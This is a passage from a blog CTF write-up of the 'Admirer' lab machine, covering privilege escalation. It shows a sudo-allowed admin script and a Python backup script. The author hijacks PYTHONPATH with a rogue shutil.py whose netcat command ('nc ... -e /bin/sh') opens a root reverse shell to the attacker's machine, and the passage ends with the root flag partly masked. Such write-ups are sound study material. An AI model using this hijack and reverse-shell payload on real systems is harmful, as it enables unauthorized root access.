-rwxr-xr-x <span style="color:#ae81ff">1</span> root admins <span style="color:#ae81ff">2613</span> Dec  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2019</span> admin_tasks.sh
-rwxr----- <span style="color:#ae81ff">1</span> root admins  <span style="color:#ae81ff">198</span> Dec  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2019</span> backup.py
drwxr-xr-x <span style="color:#ae81ff">2</span> root admins <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2019</span> .
</code></pre></div><p>admin_tasks.sh, similar to the script previously found:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
<span style="color:#75715e">#!/bin/bashview_uptime()</span>
<span style="color:#f92672">{</span>
    /usr/bin/uptime -p
<span style="color:#f92672">}</span>view_users<span style="color:#f92672">()</span>
<span style="color:#f92672">{</span>
    /usr/bin/w
<span style="color:#f92672">}</span>view_crontab<span style="color:#f92672">()</span>
<span style="color:#f92672">{</span>
    /usr/bin/crontab -l
<span style="color:#f92672">}</span>backup_passwd<span style="color:#f92672">()</span>
<span style="color:#f92672">{</span>
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$EUID<span style="color:#e6db74">&#34;</span> -eq <span style="color:#ae81ff">0</span> <span style="color:#f92672">]</span>
    <span style="color:#66d9ef">then</span>
	echo <span style="color:#e6db74">&#34;Backing up /etc/passwd to /var/backups/passwd.bak...&#34;</span>
	/bin/cp /etc/passwd /var/backups/passwd.bak
	/bin/chown root:root /var/backups/passwd.bak
	/bin/chmod <span style="color:#ae81ff">600</span> /var/backups/passwd.bak
	echo <span style="color:#e6db74">&#34;Done.&#34;</span>
    <span style="color:#66d9ef">else</span>
	echo <span style="color:#e6db74">&#34;Insufficient privileges to perform the selected operation.&#34;</span>
    <span style="color:#66d9ef">fi</span>
<span style="color:#f92672">}</span>backup_shadow<span style="color:#f92672">()</span>
<span style="color:#f92672">{</span>
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$EUID<span style="color:#e6db74">&#34;</span> -eq <span style="color:#ae81ff">0</span> <span style="color:#f92672">]</span>
    <span style="color:#66d9ef">then</span>
	echo <span style="color:#e6db74">&#34;Backing up /etc/shadow to /var/backups/shadow.bak...&#34;</span>
	/bin/cp /etc/shadow /var/backups/shadow.bak
	/bin/chown root:shadow /var/backups/shadow.bak
	/bin/chmod <span style="color:#ae81ff">600</span> /var/backups/shadow.bak
	echo <span style="color:#e6db74">&#34;Done.&#34;</span>
    <span style="color:#66d9ef">else</span>
   <span style="color:#66d9ef">fi</span>
<span style="color:#f92672">}</span>backup_web<span style="color:#f92672">()</span>
<span style="color:#f92672">{</span>
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$EUID<span style="color:#e6db74">&#34;</span> -eq <span style="color:#ae81ff">0</span> <span style="color:#f92672">]</span>
    <span style="color:#66d9ef">then</span>
	echo <span style="color:#e6db74">&#34;Running backup script in the background, it might take a while...&#34;</span>
	/opt/scripts/backup.py &amp;
    <span style="color:#66d9ef">else</span>
	echo <span style="color:#e6db74">&#34;Insufficient privileges to perform the selected operation.&#34;</span>
    <span style="color:#66d9ef">fi</span>
<span style="color:#f92672">}</span>backup_db<span style="color:#f92672">()</span>
<span style="color:#f92672">{</span>
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$EUID<span style="color:#e6db74">&#34;</span> -eq <span style="color:#ae81ff">0</span> <span style="color:#f92672">]</span>
    <span style="color:#66d9ef">then</span>
	echo <span style="color:#e6db74">&#34;Running mysqldump in the background, it may take a while...&#34;</span>
	<span style="color:#75715e">#/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp;</span>
	/usr/bin/mysqldump -u root admirerdb &gt; /var/backups/dump.sql &amp;
    <span style="color:#66d9ef">else</span>
	echo <span style="color:#e6db74">&#34;Insufficient privileges to perform the selected operation.&#34;</span>
    <span style="color:#66d9ef">fi</span>
<span style="color:#f92672">}</span><span style="color:#75715e"># Non-interactive way, to be used by the web interface</span>
<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> $# -eq <span style="color:#ae81ff">1</span> <span style="color:#f92672">]</span>
<span style="color:#66d9ef">then</span>
    option<span style="color:#f92672">=</span>$1
    <span style="color:#66d9ef">case</span> $option in
	1<span style="color:#f92672">)</span> view_uptime ;;
	2<span style="color:#f92672">)</span> view_users ;;
	3<span style="color:#f92672">)</span> view_crontab ;;
	4<span style="color:#f92672">)</span> backup_passwd ;;
	5<span style="color:#f92672">)</span> backup_shadow ;;
	6<span style="color:#f92672">)</span> backup_web ;;
	7<span style="color:#f92672">)</span> backup_db ;;

	*<span style="color:#f92672">)</span> echo <span style="color:#e6db74">&#34;Unknown option.&#34;</span> &gt;&amp;<span style="color:#ae81ff">2</span>
    esacexit <span style="color:#ae81ff">0</span>
<span style="color:#66d9ef">fi</span><span style="color:#75715e"># Interactive way, to be called from the command line</span>
options<span style="color:#f92672">=(</span><span style="color:#e6db74">&#34;View system uptime&#34;</span>
	 <span style="color:#e6db74">&#34;View logged in users&#34;</span>
	 <span style="color:#e6db74">&#34;View crontab&#34;</span>
	 <span style="color:#e6db74">&#34;Backup passwd file&#34;</span>
	 <span style="color:#e6db74">&#34;Backup shadow file&#34;</span>
	 <span style="color:#e6db74">&#34;Backup web data&#34;</span>
	 <span style="color:#e6db74">&#34;Backup DB&#34;</span>
	 <span style="color:#e6db74">&#34;Quit&#34;</span><span style="color:#f92672">)</span>echo
echo <span style="color:#e6db74">&#34;[[[ System Administration Menu ]]]&#34;</span>
PS3<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Choose an option: &#34;</span>
COLUMNS<span style="color:#f92672">=</span><span style="color:#ae81ff">11</span>
<span style="color:#66d9ef">select</span> opt in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>options[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span>
    <span style="color:#66d9ef">case</span> $REPLY in
	1<span style="color:#f92672">)</span> view_uptime ; break ;;
	2<span style="color:#f92672">)</span> view_users ; break ;;
	3<span style="color:#f92672">)</span> view_crontab ; break ;;
	4<span style="color:#f92672">)</span> backup_passwd ; break ;;
	5<span style="color:#f92672">)</span> backup_shadow ; break ;;
	6<span style="color:#f92672">)</span> backup_web ; break ;;
	7<span style="color:#f92672">)</span> backup_db ; break ;;
	8<span style="color:#f92672">)</span> echo <span style="color:#e6db74">&#34;Bye!&#34;</span> ; break ;;*<span style="color:#f92672">)</span> echo <span style="color:#e6db74">&#34;Unknown option.&#34;</span> &gt;&amp;<span style="color:#ae81ff">2</span>
    <span style="color:#66d9ef">esac</span>
doneexit <span style="color:#ae81ff">0</span>
</code></pre></div><p>After a while, I found interesting the function:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">backup_web<span style="color:#f92672">()</span>
<span style="color:#f92672">{</span>
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$EUID<span style="color:#e6db74">&#34;</span> -eq <span style="color:#ae81ff">0</span> <span style="color:#f92672">]</span>
    <span style="color:#66d9ef">then</span>
	echo <span style="color:#e6db74">&#34;Running backup script in the background, it might take a while...&#34;</span>
	/opt/scripts/backup.py &amp;
<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</code></pre></div><p>So this script call the python script backup.py and waldo has sudo permissions on the .sh file and finally the python script is executed with root permissions:</p>
<p>Checking backup.py</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">waldo@admirer:/opt/scripts$ cat backup.py 
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python3</span>

<span style="color:#f92672">from</span> shutil <span style="color:#f92672">import</span> make_archive

src <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/var/www/html/&#39;</span>

<span style="color:#75715e"># old ftp directory, not used anymore</span>
<span style="color:#75715e">#dst = &#39;/srv/ftp/html&#39;</span>

dst <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/var/backups/html&#39;</span>

make_archive(dst, <span style="color:#e6db74">&#39;gztar&#39;</span>, src)
</code></pre></div><p>After studying both files I put the effort on the library called &ldquo;shutil&rdquo;, because the python and bash scripts can not be modified.</p>
<p>checking the PYTHONPATH:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">waldo@admirer:/opt/scripts$ python -c <span style="color:#e6db74">&#39;import sys; print &#34;\n&#34;.join(sys.path)&#39;</span>

/usr/lib/python2.7
/usr/lib/python2.7/plat-x86_64-linux-gnu
/usr/lib/python2.7/lib-tk
/usr/lib/python2.7/lib-old
/usr/lib/python2.7/lib-dynload
/usr/local/lib/python2.7/dist-packages
/usr/lib/python2.7/dist-packages
</code></pre></div><p>So the strategy is library/path hijacking.</p>
<p>To do that we have to modify the PYTHONPATH to use a <em>rogue</em> library forcing to use the library <em>shutil</em> with a custom script instead the original library on a different path.</p>
<h3 id="creating-the-path-lib-inside-homewaldolib">Creating the path lib inside /home/waldo/lib</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">waldo@admirer:~$ mkdir lib
waldo@admirer:~$ cd lib/
waldo@admirer:~/lib$ nano shutil.py
waldo@admirer:~/lib$ sudo PYTHONPATH<span style="color:#f92672">=</span>/home/waldo/lib /opt/scripts/admin_tasks.sh
</code></pre></div><h3 id="custom-shutilpy">Custom shutil.py</h3>
<p>Just a simple python script to make a reverse connection with netcat. When the function backup_web() is fired, the python script will be executed as root and will open a reverse connection to our machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">waldo@admirer:~/lib$ cat shutil.py
import os
os.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;nc 10.10.14.11 1234 -e &#39;/bin/sh&#39;&#34;</span><span style="color:#f92672">)</span>
</code></pre></div><h3 id="setting-up-a-listener">Setting up a listener</h3>
<p>On the pentest machine:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lvp <span style="color:#ae81ff">1234</span>
</code></pre></div><h3 id="executing-the-file-with-sudo">Executing the file with sudo</h3>
<p>Using the option 6, Backup web data, to trigger the script:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> waldo: 

<span style="color:#f92672">[[[</span> System Administration Menu <span style="color:#f92672">]]]</span>
1<span style="color:#f92672">)</span> View system uptime
2<span style="color:#f92672">)</span> View logged in users
3<span style="color:#f92672">)</span> View crontab
4<span style="color:#f92672">)</span> Backup passwd file
5<span style="color:#f92672">)</span> Backup shadow file
6<span style="color:#f92672">)</span> Backup web data
7<span style="color:#f92672">)</span> Backup DB
8<span style="color:#f92672">)</span> Quit
Choose an option: <span style="color:#ae81ff">6</span>
Running backup script in the background, it might take a <span style="color:#66d9ef">while</span>...
</code></pre></div><h3 id="listening-incoming-connections">Listening incoming connections&hellip;</h3>
<p>Worked !</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">id                                                                                                                                                                                                                                         
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>                                                                                                                                                                                                     
cat /root/root.txt                                                                                                                                                                                                                         
16XXXXXXXXXXXXXXXXXXXXXXX2e
</code></pre></div><p>Thanks for reading!</p>
</div>

  </article>
</main>
<footer>
  <div>
    <nav class="footer-menu"><a href="https://github.com/u915">GitHub</a><a href="https://www.linkedin.com/in/daniel-canomerchan">Linkedin</a><a href="/posts/index.xml">RSS</a><a href="/sitemap.xml">Sitemap</a></nav>
    <div>¬© 2020 ‚Äî u915 ‚Äî <a href="/license/">License</a></div>
  </div>
</footer>
</body>
</html>
